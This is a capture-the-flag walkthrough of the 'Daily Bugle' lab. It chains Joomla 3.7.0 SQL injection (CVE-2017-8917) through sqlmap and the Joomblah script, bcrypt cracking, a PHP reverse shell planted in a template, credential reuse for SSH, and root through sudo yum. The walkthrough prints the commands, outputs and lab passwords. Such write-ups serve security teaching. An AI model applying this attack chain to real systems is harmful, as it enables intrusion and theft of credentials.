# Daily Bugle (Hard)

![Untitled](https://github.com/user-attachments/assets/6fd39eb9-a229-498e-9819-96c85f73e8c7)

# 1. Reconnaissance:

- Scan and enumeration with nmap and gobuster:

```bash
nmap -sV -vv -A 10.10.15.95
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-generator: Joomla! - Open Source Content Management
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   syn-ack MariaDB (unauthorized)
```

```bash
gobuster dir -u http://10.10.15.95/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -xtxt -t64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.15.95/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 234] [--> http://10.10.15.95/images/]
/media                (Status: 301) [Size: 233] [--> http://10.10.15.95/media/]
/templates            (Status: 301) [Size: 237] [--> http://10.10.15.95/templates/]
/modules              (Status: 301) [Size: 235] [--> http://10.10.15.95/modules/]
/bin                  (Status: 301) [Size: 231] [--> http://10.10.15.95/bin/]
/plugins              (Status: 301) [Size: 235] [--> http://10.10.15.95/plugins/]
/includes             (Status: 301) [Size: 236] [--> http://10.10.15.95/includes/]
/language             (Status: 301) [Size: 236] [--> http://10.10.15.95/language/]
/README.txt           (Status: 200) [Size: 4494]
/components           (Status: 301) [Size: 238] [--> http://10.10.15.95/components/]
/cache                (Status: 301) [Size: 233] [--> http://10.10.15.95/cache/]
/libraries            (Status: 301) [Size: 237] [--> http://10.10.15.95/libraries/]
/robots.txt           (Status: 200) [Size: 836]
/tmp                  (Status: 301) [Size: 231] [--> http://10.10.15.95/tmp/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/layouts              (Status: 301) [Size: 235] [--> http://10.10.15.95/layouts/]
/administrator        (Status: 301) [Size: 241] [--> http://10.10.15.95/administrator/]
/htaccess.txt         (Status: 200) [Size: 3005]
/cli                  (Status: 301) [Size: 231] [--> http://10.10.15.95/cli/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

- All the page is nothing except /administrator which we can go to the page login of administrator  and all file .txt
- Go to /administrator we have the page login name Joomla

![Untitled 1](https://github.com/user-attachments/assets/880d4a1d-f752-473b-872a-28b27d0be402)

- We can try other page /.txt to find more information about the Joomla!
- Go to /README.txt —> we have the version of Joomla! is 3.7.0

![Untitled 2](https://github.com/user-attachments/assets/96a0d090-e33a-4216-8abb-05e8ed550aeb)

- Now we can find the vuln about Joomla version 3.7.0 by exploit database

![Untitled 3](https://github.com/user-attachments/assets/d3bd3e6b-eb30-4994-936b-b15a65ac993c)

- We got the vuln Joomla 3.7 SQL Injection - CVE 2017-8917

![Untitled 4](https://github.com/user-attachments/assets/4fa43b27-4804-447b-bfd4-65debec70939)

- Now we have 2 options to exploit SQL Injection in this CVE. That is use tool SQLMap and use script python exploit CVE which we can research in github.
- Use SQLMap base exploit database:

```bash
sqlmap -u "http://<IPTarget>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

—> But we have the problem that if we use SQLMap for this case, that will be not stable. If we attempt again and again sometimes it work or it doesn’t work so we prefer using a script python in this case to scan SQLi because that is more stabler than SQLMap.

- Use script Python, we can research this in github with CVE-2017-8917
- Got it!!! we find the script name Joomblah!. Now wget it and run script.

```bash
python3 jooblah.py http://<IP-Target>/
```

```bash
  .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

—> We got the hashed Password: ‘$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm’

and username: ‘jonah’

- Dehash the password with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt test.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:10:15 DONE (2024-06-27 19:26) 0.001623g/s 76.04p/s 76.04c/s 76.04C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- Back to the page Joomla! to login with the credentials we found.

![Untitled 5](https://github.com/user-attachments/assets/572840a8-d1ad-452b-afce-243dee41235b)

—> Success! we are in the main menu Joomla!

- Now we will research around the website to find if it has the vuln we can exploit to get initial access server.
- We found in the site Templates that we can manipulate template Protostar to inject the shell into the site.

![Untitled 6](https://github.com/user-attachments/assets/98b7e315-c85c-451f-ac52-ca37de507068)

![Untitled 7](https://github.com/user-attachments/assets/544c52de-dd0a-4a60-92ba-541b5dfac6a9)

- Now in the site Protostar, we can see the list file .php and we have idea that is create the file shell format .php run it and catch the listen through netcat.
- We can use the available reverse shell in the attack machine  /usr/share/webshells/php/php-reverse-shell.php (Reverse shell PentestMonky) .

![Untitled 8](https://github.com/user-attachments/assets/a4807f7a-5a73-4f5d-bdd1-682f5f9a4870)

- Save it and run URL: `http://<IP-Target>/templates/protostar/shell.php`

![Untitled 9](https://github.com/user-attachments/assets/91e2d669-83e2-404a-b3b2-52c21b060741)

- Now we gain into the web server Apache and find more information to get SSH service.

![Untitled 10](https://github.com/user-attachments/assets/bbc601ca-42e6-48ce-8e62-8706db5d2631)

—> We find the username that maybe can use to login ssh ‘jjameson’

- `cd var/www/html`

![Untitled 11](https://github.com/user-attachments/assets/147133c5-1929-474a-8595-b94eec6ba707)

—> We have the potential file “configuration.php”. Check it !!!!!

```bash
sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'The Daily Bugle';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu'; ---> We guess that is the password which we will need.
	public $db = 'joomla';
	public $dbprefix = 'fb9j5_';
	public $live_site = '';
	public $secret = 'UAMBRWzHO3oFPmVC';
	public $gzip = '0';
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
	public $ftp_host = '127.0.0.1';
	public $ftp_port = '21';
	public $ftp_user = '';
	public $ftp_pass = '';
	public $ftp_root = '';
	public $ftp_enable = '0';
	public $offset = 'UTC';
	public $mailonline = '1';
	public $mailer = 'mail';
	public $mailfrom = 'jonah@tryhackme.com';
	public $fromname = 'The Daily Bugle';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = '0';
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = '25';
	public $caching = '0';
	public $cache_handler = 'file';
	public $cachetime = '15';
	public $cache_platformprefix = '0';
	public $MetaDesc = 'New York City tabloid newspaper';
	public $MetaKeys = '';
	public $MetaTitle = '1';
	public $MetaAuthor = '1';
	public $MetaVersion = '0';
	public $robots = '';
	public $sef = '1';
	public $sef_rewrite = '0';
	public $sef_suffix = '0';
	public $unicodeslugs = '0';
	public $feed_limit = '10';
	public $feed_email = 'none';
	public $log_path = '/var/www/html/administrator/logs';
	public $tmp_path = '/var/www/html/tmp';
	public $lifetime = '15';
	public $session_handler = 'database';
	public $shared_session = '0';
```

- Try login ssh with the credential that we have found.

```bash
ssh jjameson@10.10.150.244
jjameson@10.10.150.244's password: 
Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$ whoami
jjameson
[jjameson@dailybugle ~]$ 
```

- Now we have the way to privilege escalation. First, we can try `sudo -l`

```bash
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
[jjameson@dailybugle ~]$ 
```

—> We can use yum to privilege by researching in GTFOBins

![Untitled 12](https://github.com/user-attachments/assets/80264a92-06a9-4f74-9347-a21d6bd8c96f)

- We run code (b):

![Untitled 13](https://github.com/user-attachments/assets/21b05be5-dd44-4967-b940-1abe68c46eac)

![Untitled 14](https://github.com/user-attachments/assets/3adfecea-cceb-4e17-8a4a-bba2c8932d62)

# END!!!
